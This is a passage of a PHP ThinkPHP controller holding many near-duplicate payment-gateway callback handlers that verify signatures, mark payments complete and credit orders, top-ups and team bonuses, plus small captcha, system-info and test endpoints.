                $userModel->teamBonus($payment['user_id'], $payment['pay_amount'], $payment['id']);
                // 判断通道是否超过最大限额，超过了就关闭通道
                PaymentConfig::checkMaxPaymentLimit($payment['type'], $payment['channel'], $payment['mark']);

                Db::commit();
            } catch (Exception $e) {
                Db::rollback();
                throw $e;
            }
        }

        return 'success';
    }


    public function payNotify9()
    {
        $req = request()->param();
        //Log::debug('payNotify9:'.json_encode($req));
        //Log::save();
        $this->validate($req, [
            'code'       => 'require',
            'result'     => 'require',
            'amount'     => 'require',
            'outTradeNo' => 'require',
            'tradeNo'    => 'require',
            'payTime'    => 'require',
            'message'    => 'require',
            'sign'       => 'require',
        ]);

        $sign = $req['sign'];
        unset($req['sign'], $req['attach']);
        $my_sign = Payment::builderSign9($req);
        if ($my_sign !== $sign) {
            return 'fail签名错误';
        }

        if ($req['code'] == 10000) {
            $payment = Payment::where('trade_sn', $req['outTradeNo'])->find();
            if (!$payment) {
                return 'fail订单不存在';
            }
            if ($payment['status'] != 1) {
                return 'success';
            }
            Db::startTrans();
            try {
                Payment::where('id', $payment['id'])->update(['payment_time' => time(), 'status' => 2]);
                // 投资项目
                if ($payment['product_type'] == 1) {
                    Order::warpOrderComplete($payment['order_id']);
                } // 充值
                elseif ($payment['product_type'] == 2) {
                    Capital::topupPayComplete($payment['capital_id']);
                }
                $userModel = new User();
                $userModel->teamBonus($payment['user_id'], $payment['pay_amount'], $payment['id']);
                // 判断通道是否超过最大限额，超过了就关闭通道
                PaymentConfig::checkMaxPaymentLimit($payment['type'], $payment['channel'], $payment['mark']);

                Db::commit();
            } catch (Exception $e) {
                Db::rollback();
                throw $e;
            }
        }

        return 'success';
    }


    public function payNotify11()
    {
        $req = request()->param();
        Log::debug('payNotify11:' . json_encode($req));
        Log::save();
        $this->validate($req, [
            'merchantId' => 'require',
            'orderId'    => 'require',
            'amount'     => 'require',
            'status'     => 'require',
            'sign'       => 'require',
        ]);

        $sign = $req['sign'];
        unset($req['sign']);
        $my_sign = Payment::builderSign11($req);
        if ($my_sign !== $sign) {
            return 'fail签名错误';
        }

        if ($req['status'] == "ok") {
            $payment = Payment::where('trade_sn', $req['orderId'])->find();
            if (!$payment) {
                return 'fail订单不存在';
            }
            if ($payment['status'] != 1) {
                return 'ok';
            }
            Db::startTrans();
            try {
                Payment::where('id', $payment['id'])->update(['payment_time' => time(), 'status' => 2]);
                // 投资项目
                if ($payment['product_type'] == 1) {
                    Order::warpOrderComplete($payment['order_id']);
                } // 充值
                elseif ($payment['product_type'] == 2) {
                    Capital::topupPayComplete($payment['capital_id']);
                }
                $userModel = new User();
                $userModel->teamBonus($payment['user_id'], $payment['pay_amount'], $payment['id']);
                // 判断通道是否超过最大限额，超过了就关闭通道
                PaymentConfig::checkMaxPaymentLimit($payment['type'], $payment['channel'], $payment['mark']);

                Db::commit();
            } catch (Exception $e) {
                Db::rollback();
                throw $e;
            }
        }

        return 'ok';
    }

    public function payNotify12()
    {
        $req = request()->param();
        //Log::debug('payNotify12:'.json_encode($req));
        //Log::save();
        $this->validate($req, [
            'account_name' => 'require',
            'status'       => 'require',
            'pay_time'     => 'require',
            'pay_status'   => 'require',
            'amount'       => 'require',
            'pay_amount'   => 'require',
            'out_trade_no' => 'require',
            'trade_no'     => 'require',
            'fees'         => 'require',
            'timestamp'    => 'require',
            'thoroughfare' => 'require',
            'sign'         => 'require',
        ]);

        $sign = $req['sign'];
        unset($req['sign'], $req['attach']);
        $my_sign = Payment::builderSign12($req);
        if ($my_sign !== $sign) {
            return 'fail签名错误';
        }

        if ($req['pay_status'] == 4) {
            $payment = Payment::where('trade_sn', $req['out_trade_no'])->find();
            if (!$payment) {
                return 'fail订单不存在';
            }
            if ($payment['status'] != 1) {
                return 'success';
            }
            Db::startTrans();
            try {
                Payment::where('id', $payment['id'])->update(['payment_time' => time(), 'status' => 2]);
                // 投资项目
                if ($payment['product_type'] == 1) {
                    Order::warpOrderComplete($payment['order_id']);
                } // 充值
                elseif ($payment['product_type'] == 2) {
                    Capital::topupPayComplete($payment['capital_id']);
                }
                $userModel = new User();
                $userModel->teamBonus($payment['user_id'], $payment['pay_amount'], $payment['id']);
                // 判断通道是否超过最大限额，超过了就关闭通道
                PaymentConfig::checkMaxPaymentLimit($payment['type'], $payment['channel'], $payment['mark']);

                Db::commit();
            } catch (Exception $e) {
                Db::rollback();
                throw $e;
            }
        }

        return 'success';
    }

    public function payNotify13()
    {
        $req = request()->param();
        Log::debug('payNotify13:' . json_encode($req));
        Log::save();
        $this->validate($req, [
            'payOrderId'  => 'require',
            'mchId'       => 'require',
            'appId'       => 'require',
            'productId'   => 'require',
            'mchOrderNo'  => 'require',
            'amount'      => 'require',
            'income'      => 'require',
            'status'      => 'require',
            'paySuccTime' => 'require',
            'backType'    => 'require',
            'sign'        => 'require',
        ]);

        $sign = $req['sign'];
        unset($req['sign']);
        $my_sign = Payment::builderSign13($req);
        if ($my_sign !== $sign) {
            return 'fail签名错误';
        }

        if ($req['status'] == 2) {
            $payment = Payment::where('trade_sn', $req['mchOrderNo'])->find();
            if (!$payment) {
                return 'fail订单不存在';
            }
            if ($payment['status'] != 1) {
                return 'success';
            }
            Db::startTrans();
            try {
                Payment::where('id', $payment['id'])->update(['payment_time' => time(), 'status' => 2]);
                // 投资项目
                if ($payment['product_type'] == 1) {
                    Order::warpOrderComplete($payment['order_id']);
                } // 充值
                elseif ($payment['product_type'] == 2) {
                    Capital::topupPayComplete($payment['capital_id']);
                }
                $userModel = new User();
                $userModel->teamBonus($payment['user_id'], $payment['pay_amount'], $payment['id']);
                // 判断通道是否超过最大限额，超过了就关闭通道
                PaymentConfig::checkMaxPaymentLimit($payment['type'], $payment['channel'], $payment['mark']);

                Db::commit();
            } catch (Exception $e) {
                Db::rollback();
                throw $e;
            }
        }

        return 'success';
    }

    public function payNotify_daxiang()
    {
        $req = request()->param();
        /*         Log::debug('payNotify_daxiang:'.json_encode($req));
                Log::save(); */
        $this->validate($req, [
            'merchantId' => 'require',
            'orderId'    => 'require',
            'amount'     => 'require',
            'status'     => 'require',
            'sign'       => 'require',
        ]);

        $sign = $req['sign'];
        unset($req['sign']);
        $my_sign = Payment::builderSign_daxiang($req);
        if ($my_sign !== $sign) {
            return 'fail签名错误';
        }

        if ($req['status'] == "ok") {
            $payment = Payment::where('trade_sn', $req['orderId'])->find();
            if (!$payment) {
                return 'fail订单不存在';
            }
            if ($payment['status'] != 1) {
                return 'ok';
            }
            Db::startTrans();
            try {
                Payment::where('id', $payment['id'])->update(['payment_time' => time(), 'status' => 2]);
                // 投资项目
                if ($payment['product_type'] == 1) {
                    Order::warpOrderComplete($payment['order_id']);
                } // 充值
                elseif ($payment['product_type'] == 2) {
                    Capital::topupPayComplete($payment['capital_id']);
                }
                $userModel = new User();
                $userModel->teamBonus($payment['user_id'], $payment['pay_amount'], $payment['id']);
                // 判断通道是否超过最大限额，超过了就关闭通道
                PaymentConfig::checkMaxPaymentLimit($payment['type'], $payment['channel'], $payment['mark']);

                Db::commit();
            } catch (Exception $e) {
                Db::rollback();
                throw $e;
            }
        }

        return 'ok';
    }

    public function payNotify_huitong()
    {
        $req = request()->post();
        $this->validate($req, [
            'memberid'       => 'require',
            'orderid'        => 'require',
            'transaction_id' => 'require',
            'amount'         => 'require',
            'returncode'     => 'require',
            'datetime'       => 'require',
            'sign'           => 'require',
        ]);
        Log::debug('payNotify_huitong:' . json_encode($req));
        Log::save();
        $sign = $req['sign'];
        unset($req['sign'], $req['attach']);
        $my_sign = Payment::builderSign_huitong($req);
        if ($my_sign !== $sign) {
            return '签名错误';
        }

        if ($req['returncode'] == '00') {
            $payment = Payment::where('trade_sn', $req['orderid'])->find();
            if ($payment['status'] != 1) {
                return 'OK';
            }
            Db::startTrans();
            try {
                Payment::where('id', $payment['id'])->update(['online_sn' => $req['transaction_id'], 'payment_time' => time(), 'status' => 2]);
                // 投资项目
                if ($payment['product_type'] == 1) {
                    Order::warpOrderComplete($payment['order_id']);
                } // 充值
                elseif ($payment['product_type'] == 2) {
                    Capital::topupPayComplete($payment['capital_id']);
                }
                $userModel = new User();
                $userModel->teamBonus($payment['user_id'], $payment['pay_amount'], $payment['id']);
                // 判断通道是否超过最大限额，超过了就关闭通道
                PaymentConfig::checkMaxPaymentLimit($payment['type'], $payment['channel'], $payment['mark']);

                Db::commit();
            } catch (Exception $e) {
                Db::rollback();
                throw $e;
            }
        }

        return 'OK';
    }

    public function payNotify_999()
    {
        $req = request()->param();
        // Log::debug('payNotify999:'.json_encode($req));
        // Log::save();
        $this->validate($req, [
            'merchantId' => 'require',
            'orderId'    => 'require',
            'amount'     => 'require',
            'status'     => 'require',
            'sign'       => 'require',
        ]);

        $sign = $req['sign'];
        unset($req['sign']);
        $my_sign = Payment::builderSign_999($req);
        if ($my_sign !== $sign) {
            return 'fail签名错误';
        }

        if ($req['status'] == "ok") {
            $payment = Payment::where('trade_sn', $req['orderId'])->find();
            if (!$payment) {
                return 'fail订单不存在';
            }
            if ($payment['status'] != 1) {
                return 'ok';
            }
            Db::startTrans();
            try {
                Payment::where('id', $payment['id'])->update(['payment_time' => time(), 'status' => 2]);
                // 投资项目
                if ($payment['product_type'] == 1) {
                    Order::warpOrderComplete($payment['order_id']);
                } // 充值
                elseif ($payment['product_type'] == 2) {
                    Capital::topupPayComplete($payment['capital_id']);
                }
                $userModel = new User();
                $userModel->teamBonus($payment['user_id'], $payment['pay_amount'], $payment['id']);
                // 判断通道是否超过最大限额，超过了就关闭通道
                PaymentConfig::checkMaxPaymentLimit($payment['type'], $payment['channel'], $payment['mark']);

                Db::commit();
            } catch (Exception $e) {
                Db::rollback();
                throw $e;
            }
        }

        return 'ok';
    }

    public function payNotify_xxpay()
    {
        $req = request()->param();
        // Log::debug('payNotify_xxpay:'.json_encode($req));
        // Log::save();
        $this->validate($req, [
            'payOrderId'     => 'require',
            'mchId'          => 'require',
            'appId'          => '',
            'productId'      => 'require',
            'mchOrderNo'     => 'require',
            'amount'         => 'require',
            'income'         => 'require',
            'status'         => 'require',
            'channelOrderNo' => '',
            'paySuccTime'    => 'require',
            'backType'       => 'require',
            'reqTime'        => 'require',
            'sign'           => 'require',
        ]);

        $sign = $req['sign'];
        unset($req['sign'], $req['attach']);
        $my_sign = Payment::builderSign_xxpay($req);
        if ($my_sign !== $sign) {
            return 'fail签名错误';
        }

        if ($req['status'] == 2) {
            $payment = Payment::where('trade_sn', $req['mchOrderNo'])->find();
            if ($payment['status'] != 1) {
                return 'success';
            }
            Db::startTrans();
            try {
                Payment::where('id', $payment['id'])->update(['payment_time' => time(), 'status' => 2]);
                // 投资项目
                if ($payment['product_type'] == 1) {
                    Order::warpOrderComplete($payment['order_id']);
                } // 充值
                elseif ($payment['product_type'] == 2) {
                    Capital::topupPayComplete($payment['capital_id']);
                }
                $userModel = new User();
                $userModel->teamBonus($payment['user_id'], $payment['pay_amount'], $payment['id']);
                // 判断通道是否超过最大限额，超过了就关闭通道
                PaymentConfig::checkMaxPaymentLimit($payment['type'], $payment['channel'], $payment['mark']);

                Db::commit();
            } catch (Exception $e) {
                Db::rollback();
                throw $e;
            }
        }

        return 'success';
    }


    public function payNotify_sifang()
    {
        $req = request()->param();

        //$req = json_decode($json,true);
        $this->validate($req, [
            'payOrderId'  => 'require',
            'mchId'       => 'require',
            //'appId' => '',
            'productId'   => 'require',
            'mchOrderNo'  => 'require',
            'amount'      => 'require',
            'income'      => 'require',
            'status'      => 'require',
            'paySuccTime' => 'require',
            'backType'    => 'require',
            'sign'        => 'require',
        ]);

        $sign = $req['sign'];
        unset($req['sign']);
        $my_sign = Payment::builderSign_sifang($req);
        if ($my_sign !== $sign) {
            return 'fail签名错误';
        }

        if ($req['status'] == 2) {

            $payment = Payment::where('trade_sn', $req['mchOrderNo'])->find();
            if ($payment['status'] != 1) {
                return 'success';
            }
            Db::startTrans();
            try {
                Payment::where('id', $payment['id'])->update(['payment_time' => time(), 'status' => 2]);
                // 投资项目
                if ($payment['product_type'] == 1) {
                    Order::warpOrderComplete($payment['order_id']);
                } // 充值
                elseif ($payment['product_type'] == 2) {
                    Capital::topupPayComplete($payment['capital_id']);
                }
                $userModel = new User();
                $userModel->teamBonus($payment['user_id'], $payment['pay_amount'], $payment['id']);
                // 判断通道是否超过最大限额，超过了就关闭通道
                PaymentConfig::checkMaxPaymentLimit($payment['type'], $payment['channel'], $payment['mark']);

                Db::commit();
            } catch (Exception $e) {
                Db::rollback();
                throw $e;
            }
        }

        return 'success';
    }

    public function paynotify_startlink()
    {
        // $req = request()->post();


        $json = file_get_contents('php://input');
        Log::debug('payNotify_sifang:' . $json);
        Log::save();

        $req = json_decode($json, true);

        $this->validate($req, [
            'mchKey'        => 'require',
            'mchOrderNo'    => 'require',
            'serialOrderNo' => 'require',
            'nonce'         => 'require',
            'payStatus'     => 'require',
            'amount'        => 'require',
            'timestamp'     => 'require',
            'sign'          => 'require',
        ]);
        $sign = $req['sign'];
        unset($req['sign'], $req['attach']);
        $my_sign = Payment::builderSign_startLink($req);
        if ($my_sign !== $sign) {
            return '签名错误';
        }

        if ($req['payStatus'] == 'SUCCESS') {

            Db::startTrans();
            try {
                $payment = Payment::where('trade_sn', $req['mchOrderNo'])->lock(true)->find();
                if ($payment['status'] != 1) {
                    Db::rollback();
                    return 'SUCCESS';
                }
                Payment::where('id', $payment['id'])->update(['online_sn' => $req['serialOrderNo'], 'payment_time' => time(), 'status' => 2]);
                // 投资项目
                if ($payment['product_type'] == 1) {
                    Order::warpOrderComplete($payment['order_id']);
                } // 充值
                elseif ($payment['product_type'] == 2) {
                    Capital::topupPayComplete($payment['capital_id']);
                }
                $userModel = new User();
                $userModel->teamBonus($payment['user_id'], $payment['pay_amount'], $payment['id']);
                // 判断通道是否超过最大限额，超过了就关闭通道
                PaymentConfig::checkMaxPaymentLimit($payment['type'], $payment['channel'], $payment['mark']);

                Db::commit();
            } catch (Exception $e) {
                Db::rollback();
                throw $e;
            }
        }

        return 'SUCCESS';
    }


    public function getToken()
    {
        $req = request()->post();
        $this->validate($req, [
            'user_id' => 'require|integer',
        ]);

        if (env('common.environment') === 'local') {
            $token = aes_encrypt(['id' => $req['user_id'], 'time' => time()]);
            return out($token);
        }
    }

    public function systemInfoList()
    {
        $req = request()->post();
        $this->validate($req, [
            'type' => 'number',
            'num'  => 'number',

        ]);
        //$user = User::getUserByToken();

        $system = [];
        $system = Cache::get('system_' . $req['type'], []);

        if (empty($system) || $system == null) {
            $builder = SystemInfo::where('status', 1);
            if (!empty($req['type'])) {
                $builder->where('type', $req['type']);
                if ($req['type'] == 2) {
                    $builder->order('sort', 'asc');
                }
            }
            $num = 10;
            if (!empty($req['num'])) {
                $num = $req['num'];
            }

            $system = $builder->order('sort', 'desc')->order('created_at', 'desc')->paginate($num);
            foreach ($system as $k => $v) {
                $system[$k]['created_at'] = date("Y-m-d", strtotime($v['created_at']));
                $system[$k]['cover_img'] = get_img_api($v['cover_img']);

                // 处理content字段中的img标签，添加域名前缀
                if (!empty($v['content'])) {
                    $system[$k]['content'] = $this->processContentImages($v['content']);
                }
            }
            Cache::set('system_' . $req['type'], json_decode(json_encode($system, JSON_UNESCAPED_UNICODE), true), 10);
        } else {
            // 处理缓存数据中的图片URL
            foreach ($system as $k => &$v) {
                // 处理content字段中的img标签，添加域名前缀
                if (!empty($v['content'])) {
                    $v['content'] = $this->processContentImages($v['content']);
                }
            }
        }
        return out($system);
    }

    public function systemInfoDetail()
    {
        $req = $this->validate(request(), [
            'id' => 'require|number',
        ]);
        $user = User::getUserByToken();

        $builder = SystemInfo::where('status', 1);

        $data = $builder->where('id', $req['id'])->find();
        $data['created_at'] = date("Y-m-d", strtotime($data['created_at']));
        if (!empty($data['cover_img'])) {
            $data['cover_img'] = get_img_api($data['cover_img']);
        }

        // 处理content字段中的img标签，添加域名前缀
        if (!empty($data['content'])) {
            $data['content'] = $this->processContentImages($data['content']);
        }

        return out($data);
    }

    public function captchaImg()
    {
        /*         $req = $this->validate(request(), [
                    'phone|手机号' => 'require|mobile',
                ]); */
        //$validateCode = new \extend\validateCode\ValidateCode();
        //$validateCode->doimg();
        $uniqid = uniqid(rand(00000, 99999));
        $rs = \think\captcha\facade\Captcha::create();
        $base64_image = "data:image/png;base64," . base64_encode($rs->getData());
        $key = session('captcha.key');

        cache($uniqid, $key);
        //return $rs;
        return out(['uniqid' => $uniqid, 'image' => $base64_image]);
    }

    public function tesst2()
    {
        $req = $this->validate(request(), [
            'code|code' => 'require',
        ]);

        if (Session::has('captcha')) {
            return false;
        }

        $key = Session::get('captcha.key');

        $code = mb_strtolower($req['code'], 'UTF-8');

        $res = password_verify($code, $key);

        if ($res) {
            Session::delete('captcha');
        }

        return out(['res' => $res]);
        session('a', 'aaa');


    }

    public function test3()
    {
        $redis = new \Predis\Client(config('cache.stores.redis'));
        $redis->set('aaa', 'test');
        return out();
    }

    public function test()
    {
        return out(['test' => 1]);
    }


}
